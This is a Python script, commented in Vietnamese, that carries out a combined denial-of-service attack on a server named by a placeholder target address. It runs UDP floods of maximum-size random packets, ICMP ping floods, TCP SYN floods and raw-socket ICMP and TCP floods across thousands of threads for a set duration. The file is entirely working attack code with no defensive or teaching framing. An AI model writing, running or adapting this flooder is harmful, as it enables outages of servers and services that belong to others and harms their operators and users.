import socket
import random
import threading
import time
import os
from scapy.all import IP, ICMP, TCP, send

# Cấu hình server mục tiêu
TARGET_IP = "your-server-ip-or-domain.com"  # Thay bằng IP hoặc domain của server
TARGET_UDP_PORT = 27015  # Cổng UDP (vd: server game)
TARGET_TCP_PORT = 80  # Cổng TCP (vd: HTTP server)
PACKET_SIZE = 65507  # Kích thước gói UDP tối đa (bytes)
THREADS_UDP = 1000  # Số luồng UDP
THREADS_ICMP = 500  # Số luồng ICMP
THREADS_TCP = 1000  # Số luồng TCP
DURATION = 60  # Thời gian tấn công (giây)

# Hàm gửi UDP Flood
def udp_flood():
    """Tấn công UDP Flood sử dụng Raw Socket."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        packet = os.urandom(PACKET_SIZE)  # Gửi dữ liệu ngẫu nhiên
        while True:
            try:
                s.sendto(packet, (TARGET_IP, TARGET_UDP_PORT))
            except Exception as e:
                print(f"UDP Error: {e}")

# Hàm gửi ICMP Ping Flood
def icmp_flood():
    """Tấn công ICMP Ping Flood sử dụng Raw Socket."""
    packet = IP(dst=TARGET_IP)/ICMP()/"FloodTest"
    while True:
        try:
            send(packet, verbose=0)
        except Exception as e:
            print(f"ICMP Error: {e}")

# Hàm gửi TCP SYN Flood
def tcp_flood():
    """Tấn công TCP SYN Flood sử dụng Raw Socket."""
    while True:
        try:
            # Gửi gói SYN tới server
            ip = IP(dst=TARGET_IP)
            syn = TCP(dport=TARGET_TCP_PORT, flags="S", seq=random.randint(1, 65535))
            send(ip/syn, verbose=0)
        except Exception as e:
            print(f"TCP Error: {e}")

# Hàm gửi ICMP RAW Flood
def icmp_raw_flood():
    """Tấn công ICMP RAW Flood sử dụng Raw Socket."""
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = os.urandom(PACKET_SIZE)  # Gói tin ICMP ngẫu nhiên
    while True:
        try:
            raw_socket.sendto(packet, (TARGET_IP, 0))  # ICMP gửi trên raw socket
        except Exception as e:
            print(f"Raw ICMP Error: {e}")

# Hàm gửi TCP RAW Flood
def tcp_raw_flood():
    """Tấn công TCP RAW Flood sử dụng Raw Socket."""
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while True:
        try:
            ip = IP(dst=TARGET_IP)
            tcp = TCP(dport=TARGET_TCP_PORT, flags="S", seq=random.randint(1, 65535))
            raw_socket.sendto(bytes(ip/tcp), (TARGET_IP, TARGET_TCP_PORT))
        except Exception as e:
            print(f"Raw TCP Error: {e}")

# Hàm thực hiện tấn công
def perform_attack():
    """Thực hiện tấn công kết hợp UDP, ICMP, và TCP Flood."""
    print(f"Starting combined UDP, ICMP, and TCP flood on {TARGET_IP}...")
    threads = []

    # Tạo các luồng UDP Flood
    for _ in range(THREADS_UDP):
        thread = threading.Thread(target=udp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Tạo các luồng ICMP Flood
    for _ in range(THREADS_ICMP):
        thread = threading.Thread(target=icmp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Tạo các luồng TCP Flood
    for _ in range(THREADS_TCP):
        thread = threading.Thread(target=tcp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Tạo các luồng ICMP Raw Flood
    for _ in range(THREADS_ICMP):
        thread = threading.Thread(target=icmp_raw_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Tạo các luồng TCP Raw Flood
    for _ in range(THREADS_TCP):
        thread = threading.Thread(target=tcp_raw_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Chạy tấn công trong khoảng thời gian đã định
    try:
        for remaining in range(DURATION, 0, -1):
            print(f"Flooding... {remaining} seconds remaining")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    print("Attack finished.")

if __name__ == "__main__":
    perform_attack()
